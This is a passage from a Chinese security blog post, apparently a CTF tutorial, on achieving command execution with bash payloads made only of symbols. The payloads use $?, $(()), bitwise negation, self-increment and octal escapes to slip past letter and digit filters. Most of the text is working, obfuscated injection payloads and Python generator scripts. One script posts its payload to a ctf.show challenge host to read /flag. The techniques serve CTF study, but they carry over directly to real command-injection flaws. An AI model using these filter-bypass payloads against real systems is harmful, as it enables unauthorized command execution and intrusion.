<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-231702.png"></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h3 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用$?构造"></a>利用$?构造</h3><p>其实构造时我们也发现了，只需要找到一个值为0的变量得到bash就能继续构造。而<strong>linux中<code>$?</code>表示最后命令的退出状况，0表示没有错误，其他表示有错</strong>，那么思路就来了，只要payload不报错值不就为0嘛</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-232254.png"></p>
<p>0有了，那1怎么来呢？这里就需要字符串拼接了，<code>__=$?</code>,那<code>++__</code>不就为1了嘛，令<code>___=$((++__))</code>，那2不就也有了嘛，把之前的payload替换一下就好了:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__=$?&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$?&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br><span class="line"></span><br><span class="line">//_____=0;____=2;__=1,bash&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\154\141\147&#x27;,cat /flag</span><br></pre></td></tr></table></figure>

<p>这里就要注意了，上面那个是执行不了的，因为这里除了<strong>参数和变量扩展</strong>和<strong>单词分割</strong>外，还存在<strong>算术扩展</strong>，所以一个bash是解析不完的，只能解析<strong>参数和变量扩展</strong>和<strong>算术扩展</strong>，而<strong>单词分割</strong>没有bash解析，最后报错<code>bash: cat /flag: 没有那个文件或目录</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里多了个bash就能执行成功</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-235810.png"></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h3 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用$(())构造"></a>利用$(())构造</h3><p>前面我们已经知道<code>$(())</code>用于算术运算，而默认<code>$(())</code>为0，我们尝试取反：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(())))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003415.png"></p>
<p>那对-2取反呢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003503.png"></p>
<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
<blockquote>
<p>比如对5取反，会将5转换成二进制00000101，再取反为11111010，1表负，反转位加1即00000101表6，即-6</p>
</blockquote>
<p>根据上面的payload，我们的目的其实只用得到0，1，2，那思路不就和$?一样嘛，只用<strong>将<code>$?</code>换成<code>$(())</code>即可</strong>，这里同样进行了<strong>算术扩展解析，所以需要两个bash</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003914.png"></p>
<p>说白了，只要能得到0，1，2，无论取反和自增都能得到想要的命令，下面尝试下取反：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面是省略了+号后的式子，0取反为-1，-2取反为1，-3取反为2</p>
</blockquote>
<p>所以把上面的式子与之前payload对应的数字换掉即可，由于需要$’\154\163’</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>即：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意2个bash</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-033556.png"></p>
<p>然后就是利用变量拼接构造bash,payload:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br><span class="line">//ls</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-034050.png"></p>
<p><strong>取反脚本</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><strong>自增脚本</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>自增需要抓包后url编码传参</strong></p>
</blockquote>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11688?u_atoken=9341340a53a29d070e698cac517ace72&u_asig=1a0c381017412736154966901e00f3">利用shell脚本变量构造无字母数字命令</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/361101.html">【bashfuck】bashshell无字母命令执行原理</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io">B1ueL0n3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/">https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://b1uel0n3.github.io" target="_blank">B1ueL0n3's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/shell/">shell</a></div><div class="post-share"><div class="social-share" data-image="/img/12.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/" title="XXE学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">XXE学习</div></div><div class="info-2"><div class="info-item-1">XMLXXE是基于XML的攻击，所以在学习XXE前需了解什么是XML。 简介XML（Extensible Markup Language）：与HTML类似，是一种标记语言，但与HTML不同的是，XML 被设计用来传输和存储数据，而HTML 被设计用来显示数据。XML 仅仅是纯文本，更重要的是，通过 XML 可以发明自己的标签，因为 XML 没有预定义的标签。 作用 把数据从 HTML 分离 通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。  简化数据共享 XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。 这让创建不同应用程序可以共享的数据变得更加容易。  简化数据传输 通过XML，可以在不兼容的系统之间轻松的交换数据。  简化平台的变更 升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。 XML 数据以文本格式存储。这使得 XML...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">B1ueL0n3</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E8%84%9A%E6%9C%AC-%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">shell脚本$的用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">构造思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E6%9E%84%E9%80%A0"><span class="toc-number">4.</span> <span class="toc-text">利用$#构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E6%9E%84%E9%80%A0-1"><span class="toc-number">5.</span> <span class="toc-text">利用$?构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E6%9E%84%E9%80%A0-2"><span class="toc-number">6.</span> <span class="toc-text">利用$(())构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/" title="shell变量执行RCE"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="shell变量执行RCE"/></a><div class="content"><a class="title" href="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/" title="shell变量执行RCE">shell变量执行RCE</a><time datetime="2025-03-06T15:04:31.000Z" title="发表于 2025-03-06 23:04:31">2025-03-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/" title="XXE学习"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE学习"/></a><div class="content"><a class="title" href="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/" title="XXE学习">XXE学习</a><time datetime="2025-03-02T12:57:06.000Z" title="发表于 2025-03-02 20:57:06">2025-03-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/" title="flask session伪造"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask session伪造"/></a><div class="content"><a class="title" href="/2025/03/01/flask-session%E4%BC%AA%E9%80%A0/" title="flask session伪造">flask session伪造</a><time datetime="2025-03-01T12:30:41.000Z" title="发表于 2025-03-01 20:30:41">2025-03-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="ctfshow 2025元旦渗透赛复现"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow 2025元旦渗透赛复现"/></a><div class="content"><a class="title" href="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="ctfshow 2025元旦渗透赛复现">ctfshow 2025元旦渗透赛复现</a><time datetime="2025-03-01T08:54:36.000Z" title="发表于 2025-03-01 16:54:36">2025-03-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/23/HGAME2025-week1/" title="HGAME2025 week1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HGAME2025 week1"/></a><div class="content"><a class="title" 